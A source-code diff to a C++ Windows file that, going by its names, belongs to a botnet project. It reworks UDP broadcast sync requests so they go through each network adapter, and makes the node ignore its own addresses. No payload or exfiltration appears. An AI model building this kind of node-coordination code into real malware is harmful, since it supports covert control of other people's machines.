@@ -1,3 +1,5 @@
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+
 #include <malloc.h>
 #include <thread>
 #include "Communication.h"
@@ -15,7 +17,9 @@ void Communication::SendReply(struct sockaddr_in& client)
 	}
 
 	struct botnet_pack* p = (struct botnet_pack*)buf;
+
 	p->type = PACK_TYPE::SYNC_REPLY;
+
 	sendto(udp_sock, buf, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&client, sizeof(client));
 
 	free(buf);
@@ -23,7 +27,7 @@ void Communication::SendReply(struct sockaddr_in& client)
 //Public
 Communication::Communication()
 {
-	udp_sock = socket(AF_INET, SOCK_DGRAM, 0);
+	udp_sock = socket(AF_INET, SOCK_DGRAM, 0); 
 	check(udp_sock, "can't create udp_sock");
 	
 	int trueflag = 1;
@@ -64,27 +68,32 @@ void Communication::SyncRequest()
 		exit(1);
 	}
 
-	struct botnet_pack* p = (struct botnet_pack*)buf;
+	struct botnet_pack* p;
+	p = (struct botnet_pack*)buf;
 	struct sockaddr_in addr;
 
-	memset(buf, 1, BOTNET_PACK_SIZE);
-	memset(&addr, 0, sizeof(addr));
+	// send request threw each adapter
+	for (size_t i = 0; DEC_ADAPTER_IPS_ARR[i].hip; i++) 
+	{
+		memset(buf, 0, BOTNET_PACK_SIZE);
+		memset(&addr, 0, sizeof(addr));
 
-	//Calculating Broadcast IP
-	host = InterfaceList[1].iiAddress.AddressIn.sin_addr.S_un.S_addr;
-	netmask = InterfaceList[1].iiNetmask.AddressIn.sin_addr.S_un.S_addr;
+		// calculating Broadcast IP
+		host = DEC_ADAPTER_IPS_ARR[i].hip; // TODO
+		netmask = DEC_ADAPTER_IPS_ARR[i].netmask;
 
-	addr.sin_family = AF_INET;
-	addr.sin_port = htons(54000);
-	addr.sin_addr.S_un.S_addr = ~((netmask | host) ^ host);
+		addr.sin_family = AF_INET;
+		addr.sin_port = htons(54000);
+		addr.sin_addr.S_un.S_addr = ~((netmask | host) ^ host); //ty leo
 
-	// Adding data to the packet (TODO)
-	p->type = SYNC_REQUEST;
-	
-	//Send broadcast request for sync
-	sendto(udp_sock, buf, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&addr, sizeof(addr));
-	//Free the allocated data
+		// adding data to the packet 
+		p->type = SYNC_REQUEST;
 
+		// send broadcast request for sync
+		sendto(udp_sock, buf, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&addr, sizeof(addr));
+	}
+
+	// free the allocated data
 	free(buf);
 }
 
@@ -104,7 +113,7 @@ void Communication::HandleIncomingsUDP()
 	const struct botnet_pack* p;
 	p = (struct botnet_pack*)buf;
 
-	//Client sending the data (src)
+	//client sending the data (src)
 	struct sockaddr_in client;
 	int client_size = sizeof(client);
 	
@@ -116,7 +125,13 @@ void Communication::HandleIncomingsUDP()
 
 		recvfrom(udp_sock, buf, BOTNET_PACK_SIZE, 0, (struct sockaddr*)&client, &client_size);
 		
-		if (client.sin_addr.S_un.S_addr == DEC_MY_IP)
+		if ([=]()
+			{
+				for (size_t i = 0; DEC_ADAPTER_IPS_ARR[i].hip; i++)
+					if (DEC_ADAPTER_IPS_ARR[i].hip == client.sin_addr.s_addr)
+						return 1;
+					return 0;
+			}())
 			continue;
 
 		switch (p->type)
